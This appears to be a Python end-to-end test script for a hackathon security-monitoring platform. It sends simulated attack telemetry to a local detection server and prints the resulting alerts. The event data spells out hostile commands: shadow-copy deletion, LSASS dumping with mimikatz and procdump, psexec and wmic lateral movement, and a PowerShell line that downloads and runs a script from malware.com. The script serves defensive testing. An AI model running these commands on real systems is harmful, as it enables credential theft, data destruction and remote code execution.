#!/usr/bin/env python3
"""
Demo Test Script - End-to-End System Testing

This script tests the AI SOC platform by simulating real attacks
and showing how the system detects them.

Run this after starting the main.py server in another terminal.
"""

import requests
import json
import time
import sys
from typing import Dict, List, Optional

# Configuration
API_KEY = "test-key"  # Use same key as your server
BASE_URL = "http://localhost:8001"
WAIT_TIME = 2  # Seconds to wait for processing

# Colors for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_header(text):
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}{Colors.ENDC}\n")

def print_success(text):
    print(f"{Colors.GREEN}✅ {text}{Colors.ENDC}")

def print_error(text):
    print(f"{Colors.RED}❌ {text}{Colors.ENDC}")

def print_info(text):
    print(f"{Colors.CYAN}ℹ️  {text}{Colors.ENDC}")

def print_alert(text):
    print(f"{Colors.YELLOW}⚠️  {text}{Colors.ENDC}")

def check_server():
    """Check if server is running"""
    print_info("Checking if server is online...")
    for attempt in range(3):
        try:
            response = requests.get(f"{BASE_URL}/health", timeout=15)
            if response.status_code == 200:
                health = response.json()
                print_success("Server is online!")
                print(f"  └─ Queue depth: {health['queue_depth']}")
                print(f"  └─ Models ready: {health['model_ready']}")
                print(f"  └─ Baseline pool: {health['baseline_pool']}")
                return True
            else:
                print_error("Server returned unexpected status code")
                return False
        except requests.exceptions.Timeout:
            if attempt < 2:
                print_warning(f"  └─ Timeout on attempt {attempt + 1}, retrying...")
                time.sleep(2)
            else:
                print_error(f"Server check failed after {attempt + 1} attempts")
                return False
        except Exception as e:
            print_error(f"Server check failed: {e}")
            return False
    return False

def send_event(host_id, user_id, events, scenario_name):
    """Send events to the server"""
    print(f"\n{Colors.BOLD}Sending: {scenario_name}{Colors.ENDC}")
    payload = {
        "host_id": host_id,
        "user_id": user_id,
        "events": events
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/ingest",
            headers={"X-API-Key": API_KEY},
            json=payload,
            timeout=5
        )
        
        if response.status_code == 200:
            print_success(f"Events sent successfully!")
            print(f"  └─ Host: {host_id}")
            print(f"  └─ User: {user_id}")
            print(f"  └─ Events: {len(events)}")
            return True
        else:
            print_error(f"Server returned status {response.status_code}")
            print(f"  └─ {response.text}")
            return False
    except Exception as e:
        print_error(f"Failed to send events: {e}")
        return False

def get_latest_alert():
    """Get the most recent alert"""
    try:
        response = requests.get(
            f"{BASE_URL}/alerts?since_minutes=5",
            headers={"X-API-Key": API_KEY},
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            if data['alerts']:
                return data['alerts'][0]  # Most recent first
        return None
    except Exception as e:
        print_error(f"Failed to get alerts: {e}")
        return None

def explain_alert(incident_id):
    """Get human-friendly explanation of alert"""
    try:
        response = requests.get(
            f"{BASE_URL}/explain-threat/{incident_id}",
            headers={"X-API-Key": API_KEY},
            timeout=5
        )
        
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        print_error(f"Failed to explain alert: {e}")
        return None

def print_alert_details(alert):
    """Print alert in nice format"""
    if not alert:
        print_alert("No alert generated (score might be below threshold)")
        return
    
    print(f"\n{Colors.BOLD}🚨 ALERT DETAILS:{Colors.ENDC}")
    print(f"  ID:          {alert.get('incident_id', 'N/A')}")
    print(f"  Host:        {alert.get('host_id', 'N/A')}")
    print(f"  User:        {alert.get('user_id', 'N/A')}")
    print(f"  Score:       {alert.get('score', 'N/A')}/100")
    print(f"  Threat:      {Colors.RED}{alert.get('threat', 'N/A')}{Colors.ENDC}")
    print(f"  Rules:       {', '.join(alert.get('rules', []))}")
    print(f"  MITRE:       {', '.join(alert.get('mitre', []))}")
    print(f"  Behaviors:   {', '.join(alert.get('behavior_tags', []))}")
    print(f"  Actions:     {', '.join(alert.get('actions', []))}")
    
    # Get explanation
    print_info("Fetching human-friendly explanation...")
    explanation = explain_alert(alert['incident_id'])
    if explanation and 'why_it_matters' in explanation:
        print(f"\n{Colors.BOLD}📋 EXPLANATION:{Colors.ENDC}")
        print(f"  {explanation['why_it_matters']}")
        print(f"\n{Colors.BOLD}Recommended Actions:{Colors.ENDC}")
        for action in explanation.get('recommended_actions', []):
            print(f"  → {action}")

# ============================================================================
# ATTACK SCENARIOS
# ============================================================================

def test_ransomware():
    """Test ransomware detection"""
    print_header("TEST 1: RANSOMWARE ATTACK")
    
    events = [
        {
            "event_type": "process_spawn",
            "command_line": "whoami /priv"
        },
        {
            "event_type": "process_spawn",
            "command_line": "net user /domain"
        },
        {
            "event_type": "process_spawn",
            "command_line": "vssadmin delete shadows /all /quiet"
        },
        {
            "event_type": "file_write",
            "path": "C:\\Users\\admin\\Documents\\report.docx.locked",
            "content_sample": "\xff\xfe" + "X" * 100
        },
        {
            "event_type": "file_write",
            "path": "C:\\Users\\admin\\Desktop\\budget.xlsx.ryuk",
            "content_sample": "\xff\xfe" + "Y" * 100
        },
        {
            "event_type": "file_write",
            "path": "C:\\data\\payroll.csv.conti"
        },
        {
            "event_type": "network_flow",
            "destination": "185.220.101.10",
            "bytes_sent": 52428800,
            "bytes_recv": 1024
        }
    ]
    
    if send_event("DESKTOP-RANSOMWARE", "admin", events, "Ransomware Attack Pattern"):
        print_info(f"Waiting {WAIT_TIME}s for analysis...")
        time.sleep(WAIT_TIME)
        alert = get_latest_alert()
        print_alert_details(alert)

def test_credential_theft():
    """Test credential dumping detection"""
    print_header("TEST 2: CREDENTIAL THEFT (LSASS DUMPING)")
    
    events = [
        {
            "event_type": "process_spawn",
            "command_line": "mimikatz.exe"
        },
        {
            "event_type": "process_spawn",
            "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp"
        },
        {
            "event_type": "process_spawn",
            "command_line": "powershell -Command \"Out-Minidump -Process lsass\""
        }
    ]
    
    if send_event("SERVER-CREDS", "system", events, "LSASS Credential Dumping"):
        print_info(f"Waiting {WAIT_TIME}s for analysis...")
        time.sleep(WAIT_TIME)
        alert = get_latest_alert()
        print_alert_details(alert)

def test_lateral_movement():
    """Test lateral movement detection"""
    print_header("TEST 3: LATERAL MOVEMENT")
    
    events = [
        {
            "event_type": "process_spawn",
            "command_line": "psexec \\\\SERVER-DB cmd.exe"
        },
        {
            "event_type": "process_spawn",
            "command_line": "wmic /node:SERVER-WEB process call create \"cmd.exe\""
        },
        {
            "event_type": "process_spawn",
            "command_line": "Enter-PSSession -ComputerName SERVER-APP"
        },
        {
            "event_type": "process_spawn",
            "command_line": "net use \\\\SERVER-DATA\\IPC$ /user:admin password123"
        }
    ]
    
    if send_event("LAPTOP-SPREAD", "attacker", events, "Lateral Movement Attempt"):
        print_info(f"Waiting {WAIT_TIME}s for analysis...")
        time.sleep(WAIT_TIME)
        alert = get_latest_alert()
        print_alert_details(alert)

def test_suspicious_powershell():
    """Test obfuscated PowerShell detection"""
    print_header("TEST 4: SUSPICIOUS ENCODED POWERSHELL")
    
    events = [
        {
            "event_type": "process_spawn",
            "command_line": "powershell.exe -enc Z2V0LWNoaWxkaXRlbSAqIC1pbmNsdWRlICouZW5jcnlwdGVk"
        },
        {
            "event_type": "process_spawn",
            "command_line": "powershell.exe -encodedcommand AGMAZQBTAAAAAA..."
        },
        {
            "event_type": "process_spawn",
            "command_line": "$a = New-Object Net.WebClient; $a.DownloadString('http://malware.com/shell.ps1') | IEX"
        }
    ]
    
    if send_event("LAPTOP-PS", "user", events, "Encoded PowerShell Execution"):
        print_info(f"Waiting {WAIT_TIME}s for analysis...")
        time.sleep(WAIT_TIME)
        alert = get_latest_alert()
        print_alert_details(alert)

def test_uac_bypass():
    """Test UAC bypass detection"""
    print_header("TEST 5: UAC BYPASS ATTEMPT")
    
    events = [
        {
            "event_type": "process_spawn",
            "command_line": "fodhelper.exe"
        },
        {
            "event_type": "registry_write",
            "registry_key": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
        },
        {
            "event_type": "process_spawn",
            "command_line": "eventvwr.exe"
        }
    ]
    
    if send_event("LAPTOP-UAC", "admin", events, "UAC Bypass Attempt"):
        print_info(f"Waiting {WAIT_TIME}s for analysis...")
        time.sleep(WAIT_TIME)
        alert = get_latest_alert()
        print_alert_details(alert)

def test_clean_activity():
    """Test benign activity (should NOT generate alert)"""
    print_header("TEST 6: NORMAL BENIGN ACTIVITY (Should NOT alert)")
    
    events = [
        {
            "event_type": "process_spawn",
            "command_line": "notepad.exe C:\\file.txt"
        },
        {
            "event_type": "process_spawn",
            "command_line": "calc.exe"
        },
        {
            "event_type": "file_write",
            "path": "C:\\Users\\user\\Documents\\notes.txt"
        }
    ]
    
    if send_event("LAPTOP-CLEAN", "normaluser", events, "Normal User Activity"):
        print_info(f"Waiting {WAIT_TIME}s for analysis...")
        time.sleep(WAIT_TIME)
        alert = get_latest_alert()
        if alert:
            print_alert("Alert was generated for benign activity (possible false positive):")
            print_alert_details(alert)
        else:
            print_success("No alert generated - system correctly classified as benign! ✓")

# ============================================================================
# MAIN
# ============================================================================

def main():
    print(f"{Colors.BOLD}{Colors.CYAN}")
    print("╔════════════════════════════════════════════════════════════╗")
    print("║  AI SOC Platform - End-to-End Test Suite                   ║")
    print("║  Splunk Hackathon 2026                                     ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print(f"{Colors.ENDC}")
    
    # Step 1: Check server
    if not check_server():
        print_error("\nCannot proceed. Server is not running.")
        print_info("Start the server with: python main.py")
        sys.exit(1)
    
    # Step 2: Run tests
    print_header("Running Attack Detection Tests")
    
    try:
        test_ransomware()
        test_credential_theft()
        test_lateral_movement()
        test_suspicious_powershell()
        test_uac_bypass()
        test_clean_activity()
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        sys.exit(1)
    
    # Summary
    print_header("Test Summary")
    print(f"{Colors.GREEN}✅ All tests completed!{Colors.ENDC}")
    print(f"""
  The AI SOC Platform successfully:
  
  1. Detected ransomware encryption patterns
  2. Detected credential theft attempts
  3. Detected lateral movement
  4. Detected obfuscated PowerShell
  5. Detected UAC bypass attempts
  6. Distinguished benign activity
  
  Next steps:
  • Check the /alerts endpoint for all alerts
  • View EXAMPLES.md for more attack patterns
  • Integrate with your Splunk instance
  • Deploy to production!
""")

if __name__ == "__main__":
    main()
